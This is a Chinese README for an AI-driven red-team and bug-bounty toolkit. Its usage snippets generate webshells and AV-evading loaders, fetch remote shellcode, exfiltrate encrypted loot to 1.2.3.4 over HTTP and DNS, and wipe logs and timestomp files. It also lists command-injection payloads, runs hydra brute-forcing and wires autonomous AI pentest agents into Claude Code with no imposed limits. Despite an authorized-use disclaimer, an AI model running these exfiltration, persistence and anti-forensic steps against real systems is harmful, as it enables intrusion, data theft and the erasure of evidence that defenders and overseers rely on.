# 红队工具集 — READMEFIRST

## 概述

本目录包含完整的红队自动化工具链，覆盖从外网突破到内网靶标的全流程。
所有模块通过 `KaliBridge` SSH 远程调用 Kali 工具，也支持本地执行。

> ⚠️ **仅限授权安全演练使用（HVV/红蓝对抗/SRC）。未经授权使用属违法行为。**

---

## 红队攻击链全景

```
┌─────────────────────────────────────────────────────────────────────┐
│                        红队攻击全流程                                 │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ① 外网突破          ② 建立据点         ③ 内网横向                  │
│  ┌──────────┐       ┌──────────┐       ┌──────────┐               │
│  │ 信息收集  │──────→│ 漏洞利用  │──────→│ 隧道搭建  │               │
│  │ 漏洞发现  │       │ Webshell │       │ 内网扫描  │               │
│  │ 社工钓鱼  │       │ 免杀上线  │       │ 弱口令    │               │
│  └──────────┘       └──────────┘       └──────────┘               │
│                                              │                     │
│  ⑥ 痕迹清理          ⑤ 靶标达成         ④ 权限提升                  │
│  ┌──────────┐       ┌──────────┐       ┌──────────┐               │
│  │ 日志清除  │←──────│ 数据获取  │←──────│ 域控攻击  │               │
│  │ 工具清理  │       │ 截图取证  │       │ 本地提权  │               │
│  │ 时间戳    │       │ 报告生成  │       │ 凭证获取  │               │
│  └──────────┘       └──────────┘       └──────────┘               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 模块清单

### 已有模块（原有）

| 模块 | 文件 | 功能 |
|------|------|------|
| AI 引擎 | `agent_engine.py` | LLM 调用 + 命令执行 + 决策 |
| 自动挖洞 | `auto_hunt.py` | SRC 自动化漏洞挖掘主入口 |
| Kali 桥接 | `kali_bridge.py` | SSH 远程调用 Kali 渗透工具 |
| MSF 桥接 | `metasploit_bridge.py` | Metasploit RPC 集成 |
| 红队工具包 | `redteam_toolkit.py` | 横向/AD/钓鱼/凭证/C2/持久化 |
| 漏洞利用 | `exploit_engine.py` | 完整利用链验证引擎 |
| 攻击链建模 | `attack_chain.py` | 攻击路径概率排序 |
| CVE 情报 | `cve_intelligence.py` | 漏洞库自动匹配 |
| API 扫描 | `api_security_scanner.py` | GraphQL/REST/IDOR/认证绕过 |
| 云安全 | `cloud_scanner.py` | S3/Azure/GCP/K8s/Docker |
| WAF 绕过 | `waf_evasion_advanced.py` | 高级 WAF 绕过 |
| 代理轮换 | `proxy_rotator.py` | 多代理池管理 |
| 隐蔽 HTTP | `stealth_http.py` | 浏览器指纹模拟 |
| CNVD 扫描 | `cnvd_scanner.py` | 国产系统通用漏洞批量扫描 |

### 新增模块（红队补充）

| 模块 | 文件 | 功能 | 阶段 |
|------|------|------|------|
| 隧道管理 | `tunnel_manager.py` | frp/chisel/Neo-reGeorg/SSH/ICMP | ② 建立据点 |
| 内网扫描 | `intranet_scanner.py` | fscan/nmap/存活探测/高价值识别 | ③ 内网横向 |
| 免杀生成 | `av_bypass.py` | XOR/AES/Go加载器/分离加载 | ② 建立据点 |
| 提权辅助 | `privilege_escalation.py` | SUID/Potato/内核漏洞/PEASS | ④ 权限提升 |
| Webshell | `webshell_manager.py` | 多类型Shell统一管理/生成 | ② 建立据点 |
| 数据外传 | `data_exfil.py` | HTTP/DNS/ICMP/SMB 多通道 | ⑤ 靶标达成 |
| 痕迹清理 | `trace_cleaner.py` | 日志/工具/时间戳清理 | ⑥ 痕迹清理 |
| 红队报告 | `redteam_reporter.py` | HVV格式报告/得分统计 | ⑤ 靶标达成 |

---

## 前置依赖（需要安装的工具）

### 必装（Kali 上）

```bash
# 基础渗透工具
apt install -y nmap masscan nbtscan hydra crackmapexec
apt install -y impacket-scripts evil-winrm bloodhound

# Go 工具
go install github.com/shadow1ng/fscan@latest
go install github.com/jpillora/chisel@latest

# frp
wget https://github.com/fatedier/frp/releases/download/v0.61.0/frp_0.61.0_linux_amd64.tar.gz
tar -xzf frp_0.61.0_linux_amd64.tar.gz && cp frp_*/frp* /usr/local/bin/

# Neo-reGeorg
pip3 install neoreg

# 免杀编译
apt install -y mingw-w64 golang-go

# hashcat
apt install -y hashcat
```

### 选装

```bash
# Sliver C2（替代 MSF）
curl https://sliver.sh/install | sudo bash

# Donut（PE转Shellcode）
go install github.com/Binject/go-donut@latest

# pingtunnel（ICMP 隧道）
go install github.com/esrrhs/pingtunnel@latest
```

---

## 快速开始

### 1. 配置 Kali 桥接

```yaml
# config.yaml
kali:
  enabled: true
  host: "192.168.x.x"      # Kali IP
  user: "kali"
  ssh_key: "~/.ssh/id_rsa"
  timeout: 300
```

### 2. 外网突破后建立隧道

```python
from kali_bridge import KaliBridge
from tunnel_manager import TunnelManager

kb = KaliBridge(config)
tm = TunnelManager(kb)

# 方案 A：frp 反向代理（推荐）
tm.frp_deploy_server(vps_ip="1.2.3.4", bind_port=7000)
tm.frp_deploy_client(target_ip="10.0.0.5", vps_ip="1.2.3.4")
# 现在队友可通过 socks5://1.2.3.4:1080 访问内网

# 方案 B：chisel HTTP 隧道（穿防火墙）
tm.chisel_server(port=8080)
tm.chisel_client(server="1.2.3.4:8080")

# 方案 C：Neo-reGeorg（只有 webshell 时）
tm.neoregeorg_generate(password="r3dt3am")
# 上传 tunnel.jsp 到目标
tm.neoregeorg_connect("http://target.com/uploads/tunnel.jsp", "r3dt3am")
```

### 3. 内网扫描

```python
from intranet_scanner import IntranetScanner

scanner = IntranetScanner(kb, proxy="socks5://127.0.0.1:1080")

# fscan 一键扫（推荐）
result = scanner.fscan("10.0.0.0/24")
print(f"存活: {len(result['alive'])}, 漏洞: {len(result['vulns'])}")

# 或分步扫描
alive = scanner.ping_sweep("10.0.0.0/24", method="tcp")
hosts = scanner.port_scan(" ".join(alive))
hv_targets = scanner.identify_high_value(hosts)

# 弱口令爆破
scanner.brute_ssh(alive)
scanner.brute_smb(alive)
```

### 4. 免杀上线

```python
from av_bypass import AVBypass

avb = AVBypass(kb)

# Go 加载器（免杀率最高）
result = avb.gen_go_loader(lhost="1.2.3.4", lport=4444)
print(result["compile_cmd"])
print(result["steps"])

# 分离加载（shellcode 放 VPS）
result = avb.gen_remote_loader(shellcode_url="http://1.2.3.4/sc.bin")
```

### 5. 提权

```python
from privilege_escalation import PrivEsc

pe = PrivEsc(kb)

# Linux 提权枚举
vectors = pe.enum_linux()
suggestions = pe.enum_linux_quick()

# Windows Potato 提权
pe.potato("10.0.0.5", "user", "pass", method="god")

# 内核漏洞匹配
pe.kernel_exploit("5.4.0-42-generic")
```

### 6. Webshell 管理

```python
from webshell_manager import WebshellManager

wm = WebshellManager(kb)

# 生成 shell
php_shell = wm.generate_php(password="x", obfuscate=True)
jsp_shell = wm.generate_jsp(password="x")

# 添加已上传的 shell
wm.add_shell("http://target.com/uploads/x.php", "php_system", "x")

# 执行命令
wm.exec_cmd(0, "whoami")
wm.exec_cmd(0, "cat /etc/passwd")

# 文件操作
wm.list_dir(0, "/var/www/html")
```

### 7. 数据外传

```python
from data_exfil import DataExfil

de = DataExfil(kb)

# 收集敏感文件
de.collect_linux()

# 加密打包
de.pack_encrypt("/tmp/.loot", password="r3dt3am2026")

# 外传
de.exfil_http("/tmp/.loot.enc", "http://1.2.3.4:8080/upload")

# 隐蔽通道（DNS）
de.exfil_dns("/tmp/.loot.enc", "data.your-vps.com")
```

### 8. 痕迹清理

```python
from trace_cleaner import TraceCleaner

tc = TraceCleaner(kb)

# 标准清理
tc.clean_linux(level="standard")
tc.clean_windows("10.0.0.5", "admin", "pass")

# 选择性删除（只删自己 IP 的记录）
tc.clean_linux_selective(ip_to_remove="1.2.3.4")

# 清理上传的工具
tc.clean_tools()

# 时间戳伪造
tc.timestomp("/var/www/html/shell.php")
```

### 9. 生成报告

```python
from redteam_reporter import RedTeamReporter

rr = RedTeamReporter(team_name="Alpha", engagement="2026-HVV")

# 记录攻击路径
rr.add_path_step("FOFA 发现目标", "x.x.x.x:8080", "发现泛微OA", tools=["FOFA"])
rr.add_path_step("SQL注入获取shell", "x.x.x.x", "获得webshell", tools=["sqlmap"])
rr.add_path_step("frp建立隧道", "内网", "socks5代理建立", tools=["frp"])
rr.add_path_step("fscan内网扫描", "10.0.0.0/24", "发现DC", tools=["fscan"])
rr.add_path_step("DCSync获取域管", "DC01", "拿到域管hash", tools=["impacket"])

# 添加发现
rr.add_finding("泛微OA SQL注入", "外网突破", "critical", "x.x.x.x", "WorkPlanService SQL注入")
rr.add_finding("域控权限获取", "域控", "critical", "DC01", "DCSync获取域管NTLM")

# 生成报告
report = rr.generate(format="markdown")
rr.save("/tmp/redteam_report.md")
print(f"总得分: {rr.calculate_score()['total']}")
```

---

## 典型红队流程（速查）

```
1. FOFA/Hunter 搜目标资产         → cnvd_scanner.py / auto_hunt.py
2. 发现漏洞拿到入口                → exploit_engine.py / metasploit_bridge.py
3. 上传 webshell                   → webshell_manager.py
4. 免杀 payload 上线 C2            → av_bypass.py
5. 搭建隧道让队友进来              → tunnel_manager.py
6. 内网扫描找高价值目标            → intranet_scanner.py
7. 横向移动（PTH/PTT/WMI）        → redteam_toolkit.py
8. 提权拿到域控/SYSTEM             → privilege_escalation.py
9. 获取靶标数据                    → data_exfil.py
10. 截图取证 + 报告                → redteam_reporter.py
11. 痕迹清理                       → trace_cleaner.py
```

---

## 注意事项

1. **合法授权** — 所有操作必须在授权范围内进行
2. **最小影响** — 不破坏目标业务，不删除生产数据
3. **证据留存** — 每一步操作都要截图/录屏留证
4. **限速控制** — config.yaml 中的 rate_limit 必须遵守
5. **即时沟通** — 拿到重要权限第一时间通知队长
6. **数据安全** — 获取的数据加密存储，演练后销毁

---

## 参考项目

| 项目 | 用途 | 地址 |
|------|------|------|
| fscan | 内网综合扫描 | github.com/shadow1ng/fscan |
| frp | 反向代理隧道 | github.com/fatedier/frp |
| chisel | HTTP 隧道 | github.com/jpillora/chisel |
| Neo-reGeorg | Web 隧道 | github.com/L-codes/Neo-reGeorg |
| PEASS-ng | 提权检查 | github.com/peass-ng/PEASS-ng |
| Sliver | C2 框架 | github.com/BishopFox/sliver |
| CrackMapExec | AD/SMB 利用 | github.com/byt3bl33d3r/CrackMapExec |
| BloodHound | AD 路径分析 | github.com/BloodHoundAD/BloodHound |
| Impacket | Windows 协议工具 | github.com/fortra/impacket |
| RedTeam-Tools | 红队工具大全 | github.com/A-poc/RedTeam-Tools |



---

## SRC/赏金自动化挖掘（auto_hunt.py）

> 这是本工具的核心功能 — AI 驱动的全自动 SRC 漏洞挖掘。

### 快速开始（挖 SRC）

```bash
# 1. 安装依赖
pip install -r requirements.txt

# 2. 配置
cp config.yaml.example config.yaml
# 填入 LLM API Key（DeepSeek/OpenAI）
# 填入目标域名、Cookie（如果要测登录态接口）

# 3. 一键开挖
python auto_hunt.py --target example.com --mode auto

# 4. 半自动模式（每步确认）
python auto_hunt.py --target example.com --mode semi
```

### 10 阶段流水线

```
┌────────────────────────────────────────────────────────────────────────────┐
│                         SRC 自动化挖掘流水线                                │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│  ① Recon           ② Params          ③ ExtendedScan                       │
│  ┌──────────┐     ┌──────────┐     ┌──────────────┐                       │
│  │subfinder │     │ParamSpider│     │子域名接管验证 │                       │
│  │assetfinder│     │gf 6模式  │     │S3/Azure枚举  │                       │
│  │katana爬虫│     │GraphQL发现│     │SPA浏览器爬虫  │                       │
│  │JS密钥提取│     │arjun探测  │     │JS深度分析    │                       │
│  │tech指纹  │     │JSON字段   │     │CVE情报匹配   │                       │
│  └──────────┘     └──────────┘     │OOB回调准备   │                       │
│       │                │            └──────────────┘                       │
│       ▼                ▼                   │                               │
│  ④ Hunt            ⑤ Chain           ⑥ CriticalHunt                       │
│  ┌──────────┐     ┌──────────┐     ┌──────────────┐                       │
│  │nuclei扫描│     │9条组链规则│     │SSTI/命令注入  │                       │
│  │XSS(dalfox)│    │A→B→C自动 │     │SQLi深度(盲注) │                       │
│  │CORS+cred │     │AI辅助链  │     │密码重置接管   │                       │
│  │SSRF检测  │     │           │     │0元购/负数金额 │                       │
│  │JWT审计   │     │           │     │垂直越权      │                       │
│  │开放重定向│     │           │     │批量数据泄露   │                       │
│  │竞态/IDOR │     │           │     │OTP暴破       │                       │
│  └──────────┘     └──────────┘     └──────────────┘                       │
│       │                │                   │                               │
│       ▼                ▼                   ▼                               │
│  ⑦ DeepHunt        ⑧ Validate        ⑨ Verify         ⑩ Report           │
│  ┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐         │
│  │httpx Fuzz│     │7问门控   │     │四证齐全   │     │SRC格式   │         │
│  │IDOR系统性│     │真假判定   │     │代码路径   │     │H1/补天   │         │
│  │业务逻辑  │     │           │     │运行时证明 │     │自动生成   │         │
│  │403绕过   │     │           │     │反证检查   │     │           │         │
│  └──────────┘     └──────────┘     └──────────┘     └──────────┘         │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

### 各阶段详解

#### ① Recon（信息搜集）
- **subfinder + assetfinder** — 多源子域名枚举
- **httpx -tech-detect** — 存活探测 + 技术栈指纹
- **katana** — 主动爬虫，能渲染 JS（SPA 应用必备）
- **gau + waybackurls** — 历史 URL 收集（500+）
- **JS 文件提取** — 从 JS bundle 中 grep API 端点和硬编码密钥

#### ② Params（参数发现）
- **ParamSpider** — 被动参数发现
- **gf** — 6 种漏洞模式匹配（xss/ssrf/sqli/redirect/idor/lfi）
- **GraphQL 端点发现** — 7 种路径探测 + introspection
- **arjun** — GET/POST 双模式主动参数探测
- **JSON body 字段** — 从 API 响应中提取可注入字段名

#### ③ ExtendedScan（扩展扫描）
- **子域名接管** — CNAME 悬挂 + 多云服务商指纹匹配
- **S3/Azure/GCP Bucket** — 14 种命名模式枚举 + 可列目录检测
- **Playwright SPA 爬虫** — 拦截 XHR/Fetch 发现隐藏 API
- **JS 深度分析** — 端点/密钥/DOM XSS Sink 全量提取
- **CVE 情报匹配** — 根据技术栈自动关联已知漏洞
- **Interactsh OOB** — 为后续盲测试准备带外回调域名

#### ④ Hunt（漏洞挖掘）
- **Nuclei** — 高中危模板扫描
- **XSS** — dalfox 自动检测
- **CORS** — 带 credentials 测试
- **SSRF** — 云 metadata + 内网 IP 绕过（6 种）
- **JWT** — alg:none / HS256 弱密钥 / kid 注入
- **SQLi** — error-based 快速探测 + 时间盲注验证（**不用 sqlmap**）
- **开放重定向** — 6 种绕过 payload
- **子域名接管验证** — CNAME 确认
- **竞态条件** — AI 筛选写操作接口 + 并发测试
- **IDOR** — 双账号响应体 hash 对比

#### ⑤ Chain（自动组链）
把多个低危组合成高危：
| 链 | 组合 | 级别 |
|---|---|---|
| Open Redirect → OAuth → ATO | 重定向 + OAuth redirect_uri | Critical |
| SSRF → Cloud Metadata → RCE | SSRF + IAM credential | Critical |
| XSS → Cookie Theft → ATO | XSS + 无 HttpOnly | Critical |
| CORS + Credentials → Data Theft | CORS reflect + credentials | High |
| IDOR Read → Write/Delete | 读越权 → PUT/PATCH/DELETE | Critical |
| GraphQL Introspection → PII | schema + 敏感字段 | High |
| JWT Weak → Admin Forge | alg:none/弱密钥 → 伪造 | Critical |
| Subdomain Takeover → Session | 接管 + cookie scope | High |
| Secret Leak → Access | 密钥 → 验证可用性 | High |

#### ⑥ CriticalHunt（高危专项）
- **SSTI** — 6 种模板引擎 payload（{{7*7}}, ${7*7}, <%=7*7%>...）
- **命令注入** — ;id / |id / $(id) / 反引号 / %0a / ||
- **文件上传** — 10 种上传路径探测
- **SQLi POST JSON** — API JSON body 注入（WAF 通常不查）
- **SQLi Cookie** — Cookie 参数注入（90% WAF 不管）
- **密码重置 Host 注入** — 重置链接发到攻击者域名
- **重置 Token 泄露** — 响应中直接暴露 token
- **OTP 无限速** — 验证码接口暴力枚举
- **0 元购** — price=0 / amount=-1
- **POST 金额篡改** — AI 识别下单接口
- **垂直越权** — 普通 cookie 打 16 种 admin 路径
- **批量数据泄露** — page_size=10000 无限制

#### ⑦ DeepHunt（深度挖掘）
- 自研 httpx 异步引擎做精细化 Fuzz
- 响应差异检测（基线对比）
- 系统性 IDOR 测试（ID 遍历 + 方法切换）
- 业务逻辑竞态（真实状态对比）
- 403 绕过（Header 变异）

#### ⑧⑨⑩ Validate → Verify → Report
- **7 问门控** — 确认漏洞真实可利用
- **四证齐全** — 代码路径/运行时/证据/反证
- **自动生成报告** — 适配 HackerOne / 补天 / 漏洞盒子格式

---

### 防封 IP 策略

```yaml
# config.yaml 限速配置
rate_limit:
  requests_per_second: 2      # 默认 2 req/s（安全值）
  max_concurrent: 2
  delay_between_phases: 3     # 每步基础延迟 3s
  max_total_requests: 500     # 单次最大请求数
```

**内置防封机制：**
- 每个请求额外 0.3~1.5s **随机抖动**（防固定间隔指纹）
- 每步之间 3~5.5s **随机间隔**（不是固定值）
- WAF 检测到后**自动降速**（wafw00f 识别 → 调整策略）
- **sqlmap 完全禁用** — 用手动时间盲注替代（单请求验证）
- nuclei 带 `-rate-limit 5 -c 3`
- httpx 带 `-rate-limit 10`
- 连续 5 个 403 → 自动停止（红线机制）
- IP 被封检测 → 自动暂停

---

### config.yaml 关键配置

```yaml
# LLM（必填）
llm:
  api_key: "sk-你的Key"
  base_url: "https://api.deepseek.com/v1"
  model: "deepseek-chat"

# 目标（必填）
target:
  domain: "example.com"
  bounty_platform: "cn_src"  # hackerone / cn_src

# IDOR 双账号（推荐）
idor:
  cookie_a: "session=账号A的cookie"
  cookie_b: "session=账号B的cookie"

# Session 监控（推荐）
session_monitor:
  cookie: "你的登录cookie"
  check_url: "https://example.com/api/me"
  check_interval: 10

# 深度挖掘
deep_hunt:
  enable_fuzz: true
  enable_idor: true
  enable_bizlogic: true
  enable_auth_bypass: true

# 浏览器爬虫（可选）
browser_crawler:
  enabled: true
  max_depth: 3
  timeout: 30000
```

---

### 前置工具安装（SRC 挖洞用）

```bash
# ═══ 必装（Go 工具）═══
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/tomnomnom/assetfinder@latest
go install github.com/tomnomnom/gf@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/hahwul/dalfox/v2@latest
go install github.com/tomnomnom/anew@latest

# ═══ 必装（Python 工具）═══
pip install paramspider arjun trufflehog

# ═══ 推荐（OOB 回调）═══
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# ═══ 推荐（SPA 爬虫）═══
pip install playwright && playwright install chromium

# ═══ gf patterns（漏洞模式匹配）═══
mkdir -p ~/.gf
git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf
```

---

### 使用示例

#### 最简用法（全自动）
```bash
export DEEPSEEK_API_KEY=sk-xxx
python auto_hunt.py --target example.com --mode auto
```

#### 带 Cookie 测登录态（推荐）
```yaml
# config.yaml
session_monitor:
  cookie: "JSESSIONID=abc123; token=xyz"
  check_url: "https://example.com/api/user/info"
idor:
  cookie_a: "session=用户A"
  cookie_b: "session=用户B"
```
```bash
python auto_hunt.py --target example.com --mode auto
```

#### 国内 SRC（补天/漏洞盒子）
```yaml
target:
  domain: "xxx.com"
  bounty_platform: "cn_src"  # 使用国内 SRC 过滤规则（更宽松）
```

#### APP 类目标
```yaml
target:
  domain: "com.example.app"  # 包名
app:
  apk_path: "/path/to/app.apk"
  har_path: "/path/to/traffic.har"
```

---

### 输出文件

```
~/Desktop/doing_2026-05-31.md    ← 实时操作日志
~/.bai-agent/leads/              ← 线索收集
~/.bai-agent/checkpoints/        ← 断点（可恢复）
~/.bai-agent/experience/         ← 经验库（已禁用自动学习）
```

---

### 常见问题

**Q: 跑一半被封了怎么办？**
A: 工具会自动检测（连续 403/触发验证码）并暂停。恢复方法：
1. 换 IP（代理/VPN）
2. 降低 `requests_per_second` 到 1
3. 重新运行，自动从断点恢复

**Q: 怎么提高出洞率？**
A: 
1. 一定要配双账号（IDOR 是出洞率最高的类型）
2. 配 session cookie（很多漏洞在登录态才能测到）
3. 用 `cn_src` 平台模式（国内规则更宽松）
4. 跑完看线索文件（`~/.bai-agent/leads/`），手动深挖 AI 标记的高价值线索

**Q: 不想跑全部阶段？**
A: 用半自动模式 `--mode semi`，每个阶段前会问你是否跳过。

**Q: 支持哪些 LLM？**
A: DeepSeek（默认）/ OpenAI / 任何 OpenAI 兼容接口。设置环境变量：
```bash
export DEEPSEEK_API_KEY=sk-xxx        # DeepSeek
# 或
export OPENAI_API_KEY=sk-xxx          # OpenAI
export LLM_BASE_URL=https://xxx/v1    # 自定义接口
export LLM_MODEL=gpt-4o               # 自定义模型
```



---

## 集成 AI Agent（Tier 1 — 直接帮你挖洞）

### Shannon — 自主 AI 渗透验证器

> **核心能力**：不只是发现漏洞，**证明漏洞** — 自动发 exploit 验证
> **XBOW 基准**：96.15%（业界最高）
> **开源**：github.com/KeygraphHQ/shannon

**4 阶段自动执行**：侦察 → 并行漏洞分析 → 并行利用 → 生成报告

**安装**：
```bash
# 白盒模式（有源码时效果最好）
git clone https://github.com/KeygraphHQ/shannon.git
cd shannon && ./shannon setup

# 黑盒模式（SRC 挖洞推荐这个 fork）
git clone https://github.com/Steake/shannon-uncontained.git
```

**在 Claude Code 中使用**：
```python
from shannon_bridge import ShannonBridge
sb = ShannonBridge()

# 完整渗透（Shannon 自己做侦察→分析→利用→报告）
result = sb.pentest("https://target.com")
print(f"证明了 {result['exploits_proven']} 个漏洞")

# 对 auto_hunt 发现的漏洞做 exploit 验证
for vuln in confirmed_findings:
    proof = sb.verify_finding(vuln, "https://target.com")
    if proof["verified"]:
        print(f"🔥 {vuln['type']} 验证通过！证据：{proof['proof'][:100]}")
```

**适合场景**：
- auto_hunt 发现了疑似漏洞但不确定是否可利用 → Shannon 真打验证
- 有源码的目标 → Shannon 白盒分析更准
- H1 报告需要 PoC → Shannon 自动生成

---

### PentAGI — WSL/Docker 沙箱全自主渗透

> **核心能力**：在隔离环境中跑所有重型工具，**不封你真实 IP**
> **自带工具**：nmap/sqlmap/metasploit/hydra/nikto/masscan/...
> **开源**：github.com/vxcontrol/pentagi

**解决的问题**：
- 你怕跑 sqlmap 被封 IP → PentAGI 在隔离环境里跑，用代理出去
- 你不想在本机装 metasploit → PentAGI 自带
- 你想让 AI 自己决定用什么工具打 → PentAGI 的多 Agent 自动编排

**安装（WSL 方式 — 不需要 Docker Desktop）**：
```bash
# 1. 确保 Windows 有 WSL2
wsl --install

# 2. 进入 WSL 安装
wsl -d Ubuntu

# 3. 在 WSL 内装 Docker（不需要 Docker Desktop）
sudo apt update && sudo apt install -y docker.io docker-compose-v2
sudo service docker start

# 4. 克隆 PentAGI
git clone https://github.com/vxcontrol/pentagi.git
cd pentagi
cp .env.example .env
# 编辑 .env 填入 OPENAI_API_KEY 或 ANTHROPIC_API_KEY

# 5. 启动
docker compose up -d

# 6. Windows 侧直接访问: http://localhost:8228
```

**在 Claude Code 中使用**：
```python
from pentagi_bridge import PentAGIBridge
pb = PentAGIBridge()

# 全自动渗透（PentAGI 自己决定策略）
result = pb.auto_pentest("target.com")

# 安全跑 sqlmap（Docker沙箱里，不封你IP）
result = pb.sqlmap_safe("http://target.com/page?id=1", level=5, risk=3)

# 下发任意渗透任务
result = pb.execute_task("对 10.0.0.0/24 做内网横向移动测试")

# 跑指定工具
result = pb.run_tool("nmap", "-sV -sC -p- target.com")
result = pb.run_tool("hydra", "-l admin -P /usr/share/wordlists/rockyou.txt target.com ssh")
```

**适合场景**：
- 需要跑 sqlmap/hydra/masscan 等重型扫描（怕封 IP）
- 内网渗透（PentAGI Docker 可配代理进内网）
- 需要 metasploit 自动利用

---

### Strix — 快速 AI 渗透扫描器

> **核心能力**：像真人黑客动态测试，**自动生成 PoC**，零误报设计
> **速度**：比 Shannon 快（适合初始大面积扫描）
> **开源**：github.com/usestrix/strix

**支持扫描类型**：Web URL / API / GitHub 仓库 / 域名 / IP

**安装**：
```bash
# 方式 1: pip（最简单，直接本机跑）
pip install strix-cli

# 方式 2: WSL 内 Docker（推荐隔离）
wsl -d Ubuntu
docker pull ghcr.io/usestrix/strix:latest

# 配置 LLM（任选一个）
export ANTHROPIC_API_KEY=sk-xxx
# 或 export OPENAI_API_KEY=sk-xxx
```

**在 Claude Code 中使用**：
```python
from strix_bridge import StrixBridge
sb = StrixBridge()

# 快速扫描 Web 应用
result = sb.scan_url("https://target.com")
print(f"发现 {result['critical_high']} 个高危，{len(result['pocs'])} 个有 PoC")

# 扫描整个域名（含子域名发现）
result = sb.scan_domain("target.com")

# 扫描 GitHub 仓库（白盒 SAST + 动态验证）
result = sb.scan_repo("https://github.com/org/repo")

# 只测特定漏洞类型
result = sb.scan_url("https://target.com", focus=["sqli", "idor", "ssrf"])
```

**适合场景**：
- 新目标初始扫描（快速覆盖全面）
- CI/CD 集成（每次部署自动测）
- 需要 PoC 的报告提交

---

### 三者配合使用（推荐工作流）

```
① Strix 快扫（3分钟）→ 发现攻击面 + 低级漏洞
② auto_hunt 深度挖掘（20分钟）→ 逻辑漏洞 + 组链
③ Shannon 验证（5分钟/漏洞）→ 真打出 PoC
④ PentAGI 辅助（需要重型工具时）→ sqlmap/metasploit

效率最大化：
  Strix 广度覆盖 + auto_hunt 深度 + Shannon 证明 + PentAGI 执行
```

**config.yaml 配置**：
```yaml
# Tier 1 Agents
shannon:
  path: "~/shannon-uncontained"  # Shannon 安装路径

pentagi:
  api_url: "http://localhost:8228"  # PentAGI API
  path: "~/pentagi"

strix:
  path: "strix"         # strix CLI 路径
  docker: false          # 是否用 Docker 运行
  image: "ghcr.io/usestrix/strix:latest"
```



---

## Web3 智能合约审计（web3_auditor.py）

> 赏金最高：Immunefi 单个 Critical 可达 $1M，普通 High 也有 $10K-$100K

### 能检测什么

| 漏洞类型 | 严重度 | 例子 |
|---------|--------|------|
| 重入攻击 | Critical | DAO Hack（$60M）、Cream Finance |
| 预言机操控 | Critical | 闪电贷操控 Uniswap spot price |
| ERC-4626 通胀 | Critical | $11M+ 损失（2025-2026） |
| 未初始化代理 | Critical | Wormhole（$326M） |
| 访问控制缺陷 | High | tx.origin 认证绕过 |
| 闪电贷攻击面 | High | 单交易内状态操控 |
| 整数溢出 | High | Solidity <0.8 unchecked |
| delegatecall | Critical | 存储槽冲突/恶意实现 |
| 前端运行(MEV) | Medium | 缺滑点保护被夹击 |
| ERC20 返回值 | Medium | 某些代币 transfer 不 revert |

### 工具依赖

```bash
# Slither（必装 — 80+ 检测器）
pip install slither-analyzer

# Mythril（可选 — 符号执行，更深但更慢）
pip install mythril

# Foundry（可选 — Fuzz 测试）
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Etherscan API Key（审计已部署合约用）
export ETHERSCAN_API_KEY=xxx
```

### 用法

```python
from web3_auditor import Web3Auditor

auditor = Web3Auditor(engine)  # engine 有 LLM 时能做逻辑分析

# 1. 审计本地合约文件
result = auditor.audit_file("contracts/Vault.sol")
print(f"发现: {result['total_findings']} 个 (Critical: {len(result['critical'])})")

# 2. 审计 GitHub 仓库（一键）
result = auditor.audit_repo("https://github.com/some-protocol/contracts")

# 3. 审计已部署合约（自动拉 Etherscan verified 源码）
result = auditor.audit_deployed("0x1234abcd...", chain="ethereum")
# 支持: ethereum / bsc / polygon / arbitrum

# 4. DeFi 协议深度审计（闪电贷/预言机/Vault 专项）
result = auditor.defi_deep_audit("./protocol-contracts/")
for f in result["defi_findings"]:
    print(f"  [{f['severity']}] {f['type']}: {f['description'][:80]}")
```

### Web3 赏金平台

| 平台 | 特点 | 赏金 |
|------|------|------|
| **Immunefi** | 最大 Web3 赏金平台，93% Critical 漏洞在这披露 | $1K-$1M+ |
| **Sherlock** | 审计竞赛模式，固定奖金池 | $5K-$200K/竞赛 |
| **Code4rena** | 审计竞赛，按发现分赏金 | $2K-$100K |
| **HackenProof** | 偏交易所和基础设施 | $500-$50K |

### 推荐工作流

```
1. 在 Immunefi 找有赏金的协议（按 TVL 排序）
2. git clone 他们的合约仓库
3. 跑 auditor.audit_repo() — 自动 Slither + 模式匹配 + LLM
4. 重点看 Critical/High 发现
5. 手动验证（写 Foundry PoC 或用 Tenderly fork 模拟）
6. 提交到 Immunefi
```

### Immunefi 提交注意事项

- 必须有可复现的 PoC（Foundry test 或 Tenderly fork）
- 必须说明影响金额（"影响 $X TVL"）
- 理论漏洞不收 — 必须证明可利用
- 已知问题/设计权衡不算漏洞
- 提交前检查 protocol 的 known issues 列表



---

## 挖洞策略建议（仅供参考，不做强制限制）

> ⚠️ 以下是策略建议，**不是过滤规则**。所有漏洞类型都可以扫、都可以报。
> 建议的目的是帮你把时间花在出赏金概率最高的方向上，但**绝不阻止任何探索**。

### Web2 — HackerOne / Intigriti / Bugcrowd / 补天

**高概率出赏金（优先投入时间）**：
- IDOR 越权（需双账号，占 H1 赏金 30%）
- SQLi（时间盲注验证，不用 sqlmap）
- SSRF + 云 metadata（一个请求确认 Critical）
- 认证接管（密码重置 Host 注入、Token 泄露）
- 支付逻辑（0 元购、负数金额、竞态双花）
- JWT 弱配置（alg:none 直接伪造）
- 子域名接管（CNAME 悬挂，注册声明）
- GraphQL 越权（introspection → 敏感字段直接查）

**中等概率（发现了别丢，可能组链）**：
- 开放重定向（单独低危，但 + OAuth = Critical ATO）
- CORS 错配（+ credentials = 数据窃取）
- XSS（竞争大，但 stored XSS + cookie theft = High）
- 目录列表/Source Map（可能暴露密钥或隐藏接口）
- 信息泄露（手机号/邮箱/内部 ID = 国内 SRC 收）

**概率较低但一旦出就是 Critical（碰运气）**：
- RCE（SSTI / 命令注入 / 文件上传 getshell）
- SSRF → 内网 → Redis/Docker API
- 反序列化 RCE

### Web3 — Immunefi / Sherlock / Code4rena

